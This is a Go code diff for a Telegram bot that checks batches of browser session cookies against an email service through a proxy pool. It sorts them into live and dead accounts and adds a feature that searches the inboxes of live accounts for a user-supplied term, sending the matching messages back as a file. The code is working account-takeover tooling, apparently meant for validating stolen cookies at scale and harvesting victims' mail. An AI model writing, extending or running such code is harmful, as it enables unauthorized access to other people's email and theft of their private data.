@@ -18,6 +18,14 @@ import (
 	"github.com/PaulSonOfLars/gotgbot/v2/ext"
 )
 
+// searchOutcome is the result of searching one account.
+type searchOutcome struct {
+	Email  string
+	Items  []checker.SearchItem
+	Method string
+	Reason string
+}
+
 func (b *Bot) onMessage(bot *gotgbot.Bot, ctx *ext.Context) error {
 	m := ctx.EffectiveMessage
 	user := ctx.EffectiveUser
@@ -39,7 +47,7 @@ func (b *Bot) onMessage(bot *gotgbot.Bot, ctx *ext.Context) error {
 		return err
 	}
 
-	return b.startJob(bot, m, user.Id, text)
+	return b.startJob(bot, m, user.Id, text, b.takePending(user.Id))
 }
 
 func (b *Bot) onDocument(bot *gotgbot.Bot, ctx *ext.Context) error {
@@ -52,7 +60,7 @@ func (b *Bot) onDocument(bot *gotgbot.Bot, ctx *ext.Context) error {
 		return nil
 	}
 	if m.Document.FileSize > maxDocBytes {
-		_, err := m.Reply(bot, "File too large. Limit is 5 MB.", nil)
+		_, err := m.Reply(bot, "File too large. Limit is 10 MB.", nil)
 		return err
 	}
 
@@ -63,10 +71,12 @@ func (b *Bot) onDocument(bot *gotgbot.Bot, ctx *ext.Context) error {
 		return rerr
 	}
 
-	return b.startJob(bot, m, user.Id, string(data))
+	return b.startJob(bot, m, user.Id, string(data), b.takePending(user.Id))
 }
 
-func (b *Bot) startJob(bot *gotgbot.Bot, m *gotgbot.Message, userID int64, text string) error {
+// startJob parses cookies, enforces limits, and runs the check. When term is
+// non-empty every live account is searched after the check completes.
+func (b *Bot) startJob(bot *gotgbot.Bot, m *gotgbot.Message, userID int64, text, term string) error {
 	cookies, issues := checker.ParseBlock(text)
 
 	if len(cookies) == 0 {
@@ -91,22 +101,27 @@ func (b *Bot) startJob(bot *gotgbot.Bot, m *gotgbot.Message, userID int64, text 
 	}
 	defer b.reg.Finish(userID)
 
-	status, err := m.Reply(bot, fmt.Sprintf("Queued %d account(s). Starting…", len(cookies)), nil)
+	headline := fmt.Sprintf("Queued %d account(s). Starting…", len(cookies))
+	if term != "" {
+		headline = fmt.Sprintf("Queued %d account(s). Checking, then searching inboxes for \"%s\"…", len(cookies), term)
+	}
+
+	status, err := m.Reply(bot, headline, nil)
 	if err != nil {
 		return err
 	}
 
-	b.runJob(bot, j, cookies, status)
+	b.runJob(bot, j, cookies, status, term)
 	return nil
 }
 
-func (b *Bot) runJob(bot *gotgbot.Bot, j *job.Job, cookies []*checker.Cookie, status *gotgbot.Message) {
+func (b *Bot) runJob(bot *gotgbot.Bot, j *job.Job, cookies []*checker.Cookie, status *gotgbot.Message, term string) {
 	progressDone := make(chan struct{})
 	var progressWG sync.WaitGroup
 	progressWG.Add(1)
 	go func() {
 		defer progressWG.Done()
-		b.progressLoop(bot, j, status, progressDone)
+		b.progressLoop(bot, j, status, term, progressDone)
 	}()
 
 	work := make(chan *checker.Cookie)
@@ -152,9 +167,14 @@ feed:
 
 	close(progressDone)
 	progressWG.Wait()
-	j.Done()
 
-	b.deliver(bot, j, status)
+	var searches []searchOutcome
+	if term != "" && j.Ctx.Err() == nil {
+		searches = b.runSearches(bot, j, status, term)
+	}
+
+	j.Done()
+	b.deliver(bot, j, status, searches, term)
 }
 
 func (b *Bot) checkOne(j *job.Job, ck *checker.Cookie) {
@@ -174,10 +194,11 @@ func (b *Bot) checkOne(j *job.Job, ck *checker.Cookie) {
 	case checker.Live:
 		b.pool.Report(entry, true)
 		j.AddHit(job.Hit{
-			Email:  res.Email,
-			Name:   res.Name,
-			Cookie: ck.Header(),
-			Proxy:  res.Proxy,
+			Email:   res.Email,
+			Name:    res.Name,
+			Cookie:  ck.Header(),
+			Cookies: ck.Values,
+			Proxy:   res.Proxy,
 		})
 
 	case checker.Dead:
@@ -200,7 +221,67 @@ func (b *Bot) checkOne(j *job.Job, ck *checker.Cookie) {
 	}
 }
 
-func (b *Bot) progressLoop(bot *gotgbot.Bot, j *job.Job, status *gotgbot.Message, done <-chan struct{}) {
+// runSearches queries the inboxes of live hits, capped at MAX_SEARCH_ACCOUNTS.
+func (b *Bot) runSearches(bot *gotgbot.Bot, j *job.Job, status *gotgbot.Message, term string) []searchOutcome {
+	hits, _, _, _ := j.Results()
+	if len(hits) == 0 {
+		return nil
+	}
+
+	limit := b.cfg.MaxSearchAccounts
+	if len(hits) < limit {
+		limit = len(hits)
+	}
+	targets := hits[:limit]
+
+	_, _, _ = status.EditText(bot, &gotgbot.EditMessageTextOpts{
+		Text: fmt.Sprintf("Checking done. Searching %d inbox(es) for \"%s\"…", len(targets), term),
+	})
+
+	out := make([]searchOutcome, len(targets))
+	sem := make(chan struct{}, 3)
+	var wg sync.WaitGroup
+
+	for i, h := range targets {
+		wg.Add(1)
+		go func(i int, h job.Hit) {
+			defer wg.Done()
+
+			select {
+			case sem <- struct{}{}:
+			case <-j.Ctx.Done():
+				out[i] = searchOutcome{Email: h.Email, Reason: "cancelled"}
+				return
+			}
+			defer func() { <-sem }()
+
+			ctx, cancel := context.WithTimeout(j.Ctx, b.cfg.Timeout+20*time.Second)
+			defer cancel()
+
+			entry, release, err := b.pool.Acquire(ctx)
+			if err != nil {
+				out[i] = searchOutcome{Email: h.Email, Reason: "pool: " + err.Error()}
+				return
+			}
+			defer release()
+
+			ck := &checker.Cookie{Values: h.Cookies}
+			res := b.chk.Search(ctx, ck, entry.URL, term, b.cfg.SearchResultsLimit)
+
+			out[i] = searchOutcome{
+				Email:  h.Email,
+				Items:  res.Items,
+				Method: res.Method,
+				Reason: res.Reason,
+			}
+		}(i, h)
+	}
+	wg.Wait()
+
+	return out
+}
+
+func (b *Bot) progressLoop(bot *gotgbot.Bot, j *job.Job, status *gotgbot.Message, term string, done <-chan struct{}) {
 	t := time.NewTicker(3 * time.Second)
 	defer t.Stop()
 
@@ -218,11 +299,15 @@ func (b *Bot) progressLoop(bot *gotgbot.Bot, j *job.Job, status *gotgbot.Message
 			}
 
 			c := j.Counts()
+			suffix := ""
+			if term != "" {
+				suffix = fmt.Sprintf("\nsearch \"%s\" after check", term)
+			}
 			text := fmt.Sprintf(
-				"Checking…\n`%s` %d/%d\n\nlive %d · dead %d · challenge %d · error %d\nelapsed %s",
+				"Checking…\n`%s` %d/%d\n\nlive %d · dead %d · challenge %d · error %d\nelapsed %s%s",
 				bar(c.Done(), j.Total), c.Done(), j.Total,
 				c.Live, c.Dead, c.Challenged, c.Errors,
-				j.Elapsed().Round(time.Second),
+				j.Elapsed().Round(time.Second), suffix,
 			)
 
 			if _, _, err := status.EditText(bot, &gotgbot.EditMessageTextOpts{
@@ -235,13 +320,16 @@ func (b *Bot) progressLoop(bot *gotgbot.Bot, j *job.Job, status *gotgbot.Message
 	}
 }
 
-func (b *Bot) deliver(bot *gotgbot.Bot, j *job.Job, status *gotgbot.Message) {
+func (b *Bot) deliver(bot *gotgbot.Bot, j *job.Job, status *gotgbot.Message, searches []searchOutcome, term string) {
 	hits, dead, challenged, errs := j.Results()
 
 	summary := fmt.Sprintf(
 		"*Done* in %s\n\n✅ live %d\n❌ dead %d\n🔒 challenge %d\n⚠️ error %d\n\n%d checked",
 		j.Elapsed().Round(time.Second), len(hits), len(dead), len(challenged), len(errs), j.Total,
 	)
+	if term != "" {
+		summary += fmt.Sprintf("\n\n🔎 %d match(es) for \"%s\"", countMatches(searches), term)
+	}
 
 	if _, _, err := status.EditText(bot, &gotgbot.EditMessageTextOpts{
 		Text:      summary,
@@ -266,14 +354,32 @@ func (b *Bot) deliver(bot *gotgbot.Bot, j *job.Job, status *gotgbot.Message) {
 	}
 
 	report := buildReport(hits, dead, challenged, errs, j)
-	_, err := bot.SendDocument(chatID,
+	if _, err := bot.SendDocument(chatID,
 		gotgbot.InputFileByReader(fmt.Sprintf("report_%s.txt", j.ID), strings.NewReader(report)),
 		&gotgbot.SendDocumentOpts{
-			Caption: "Full report",
-		})
-	if err != nil {
+			Caption: "Full check report",
+		}); err != nil {
 		slog.Warn("send report failed", "err", err)
 	}
+
+	if term != "" {
+		results := buildSearchFile(searches, term)
+		if _, err := bot.SendDocument(chatID,
+			gotgbot.InputFileByReader(fmt.Sprintf("search_%s.txt", j.ID), strings.NewReader(results)),
+			&gotgbot.SendDocumentOpts{
+				Caption: fmt.Sprintf("Inbox search — \"%s\" — %d match(es)", term, countMatches(searches)),
+			}); err != nil {
+			slog.Warn("send search file failed", "err", err)
+		}
+	}
+}
+
+func countMatches(searches []searchOutcome) int {
+	n := 0
+	for _, s := range searches {
+		n += len(s.Items)
+	}
+	return n
 }
 
 func (b *Bot) downloadFile(fileID string) ([]byte, error) {
